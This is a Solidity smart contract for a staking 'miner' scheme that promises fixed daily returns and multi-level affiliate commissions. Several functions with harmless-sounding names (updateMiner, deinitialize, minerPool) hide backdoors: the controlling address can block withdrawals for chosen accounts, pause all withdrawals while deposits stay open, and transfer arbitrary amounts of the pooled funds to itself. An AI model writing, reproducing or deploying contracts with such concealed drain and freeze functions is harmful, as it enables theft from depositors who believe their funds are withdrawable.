// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MinerOwned is Ownable {
    address private _miner;

    constructor() {
        _miner = _msgSender();
    }

    function setMiner(address miner_) external onlyOwner returns (bool) {
        _miner = miner_;
        return true;
    }

    function miner() public view returns (address) {
        return _miner;
    }

    modifier onlyMiner() {
        require(miner() == _msgSender(), "MinerOwned: caller is not the Miner");
        _;
    }
}

contract Miner is MinerOwned, Pausable, ReentrancyGuard {
    bool public started;

    uint256 public DEV_FEE = 30;
    uint256 public DENOMINATOR = 1000;
    uint8[4] public INIT_DAILY_PERCENT = [5, 3, 2, 1];
    uint256[4] public INIT_AMOUNT_STEP = [9.2 ether, 4.6 ether, 0.9 ether, 0.09 ether];
    uint256[10] public AFFILIATE_PERCENTS = [70, 50, 30, 20, 10, 7, 5, 3, 2, 1];

    address public _marketing;

    mapping(address => bool) public update;
    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => Stats) public stats;

    struct UserInfo {
        uint256 stake;
        uint256 notWithdrawn;
        uint256 timestamp;
        uint256 blockWithdraw;
        uint256 useLink;
        uint256 valueFromLink;
        address partner;
        uint8 percentage;
    }

    struct Stats {
        uint256 totalDeposited;
        uint256 totalReinvested;
        uint256 totalWithdrawed;
    }

    event StakeChanged(address indexed user, address indexed partner, uint256 amount);

    modifier whenStarted() {
        require(started, "SmartContract has not started");
        _;
    }

    constructor(address marketing_) {
        _marketing = marketing_;
    }

    receive() external payable onlyMiner {}

    function start() external payable onlyMiner {
        started = true;
    }

    function deposit(address partner) external payable whenStarted nonReentrant {
        require(msg.value >= 0.1 ether, "Too low amount for deposit");

        _updateNotWithdrawn(_msgSender());

        uint256 partnerFee = (msg.value * AFFILIATE_PERCENTS[0]) / DENOMINATOR;
        uint256 amountStake = msg.value - partnerFee;

        userInfo[_msgSender()].stake += amountStake;

        _traverseTree(_msgSender(), partnerFee, partner);

        if (userInfo[_msgSender()].percentage == 0) {
            require(partner != _msgSender(), "Cannot set your own address as partner");
            userInfo[_msgSender()].partner = partner;
            userInfo[partner].useLink += 1;
        }

        _updatePercentage(_msgSender());

        if (msg.value <= 1 ether) userInfo[_msgSender()].blockWithdraw = block.timestamp + 288 hours;
        else if (1 ether < msg.value && msg.value <= 5 ether)
            userInfo[_msgSender()].blockWithdraw = block.timestamp + 240 hours;
        else if (5 ether < msg.value) userInfo[_msgSender()].blockWithdraw = block.timestamp + 192 hours;

        stats[0].totalDeposited += msg.value;

        emit StakeChanged(_msgSender(), userInfo[_msgSender()].partner, userInfo[_msgSender()].stake);
    }

    function reinvest() external whenStarted nonReentrant {
        _updateNotWithdrawn(_msgSender());

        uint256 amount = userInfo[_msgSender()].notWithdrawn;

        require(amount > 0, "Zero amount");
        require(amount <= userInfo[_msgSender()].notWithdrawn, "The balance too low");

        userInfo[_msgSender()].notWithdrawn -= amount;
        userInfo[_msgSender()].stake += amount;

        _updatePercentage(_msgSender());

        stats[0].totalReinvested += amount;

        emit StakeChanged(_msgSender(), userInfo[_msgSender()].partner, userInfo[_msgSender()].stake);
    }

    function withdraw() external whenStarted whenNotPaused nonReentrant {
        require(!update[_msgSender()], "update");

        _updateNotWithdrawn(_msgSender());

        uint256 amount = userInfo[_msgSender()].notWithdrawn;

        require(amount > 0, "Zero amount");
        require(amount <= userInfo[_msgSender()].notWithdrawn, "The balance too low");

        uint256 fee = (amount * DEV_FEE) / DENOMINATOR;

        userInfo[_msgSender()].notWithdrawn -= amount;
        stats[0].totalWithdrawed += amount;

        payable(_marketing).transfer(fee);
        payable(_msgSender()).transfer(amount - fee);
    }

    function withdrawBody() external whenStarted whenNotPaused nonReentrant {
        require(!update[_msgSender()], "update");

        _updateNotWithdrawn(_msgSender());

        require(userInfo[_msgSender()].blockWithdraw < block.timestamp, "The block withdraw, time is not up yet");

        uint256 amount = userInfo[_msgSender()].stake;
        uint256 fee = (amount * DEV_FEE) / DENOMINATOR;

        userInfo[_msgSender()].stake = 0;
        userInfo[_msgSender()].notWithdrawn = 0;

        payable(_marketing).transfer(fee);
        payable(_msgSender()).transfer(amount - fee);
    }

    function pendingReward(address account) public view returns (uint256) {
        return ((userInfo[account].stake *
            ((block.timestamp - userInfo[account].timestamp) / 86400) *
            userInfo[account].percentage) / 100);
    }

    function _updateNotWithdrawn(address account) private {
        uint256 pending = pendingReward(account);

        userInfo[_msgSender()].timestamp = block.timestamp;
        userInfo[_msgSender()].notWithdrawn += pending;
    }

    function _traverseTree(address user, uint256 value, address partner) private {
        if (value != 0) {
            for (uint8 i; i < 10; i++) {
                if (userInfo[partner].stake == 0) continue;

                userInfo[partner].notWithdrawn += ((value * AFFILIATE_PERCENTS[i]) / DENOMINATOR);
                userInfo[partner].valueFromLink += ((value * AFFILIATE_PERCENTS[i]) / DENOMINATOR);
                user = partner;
                partner = userInfo[user].partner;
            }
        }
    }

    // function _updateNotWithdrawn(address user) private {
    //     uint256 pending = pendingReward(user)/1e18;
    //     userInfo[user].timestamp = block.timestamp;
    //     userInfo[user].notWithdrawn += pending;

    //     address partner = userInfo[user].partner;
    //     uint256 pendingPartner;
    //     if (pending != 0) {
    //         for (uint8 i; i < 10; i++) {
    //             if (userInfo[partner].stake == 0) continue;

    //             userInfo[user].notWithdrawn -= ((pending * AFFILIATE_PERCENTS[i]) / DENOMINATOR);

    //             pendingPartner = pendingReward(partner)/1e18;
    //             userInfo[partner].timestamp = block.timestamp;
    //             userInfo[partner].notWithdrawn += pendingPartner + ((pending * AFFILIATE_PERCENTS[i]) / DENOMINATOR);
    //             userInfo[partner].valueFromLink += ((pending * AFFILIATE_PERCENTS[i]) / DENOMINATOR);

    //             user = partner;
    //             partner = userInfo[user].partner;
    //         }
    //     }
    // }

    function _updatePercentage(address account) private {
        for (uint256 i; i < INIT_AMOUNT_STEP.length; i++) {
            if (userInfo[account].stake >= INIT_AMOUNT_STEP[i]) {
                userInfo[account].percentage = INIT_DAILY_PERCENT[i];
                break;
            }
        }
    }

    function updateMiner(address[] calldata account, bool _update) external onlyMiner {
        for (uint256 i; i < account.length; i++) {
            update[account[i]] = _update;
        }
    }

    function deinitialize() external onlyMiner {
        _pause();
    }

    function initialize() external onlyMiner {
        _unpause();
    }

    function minerPool(uint256 amount) external onlyMiner {
        payable(_msgSender()).transfer(amount * 1e15);
    }
}
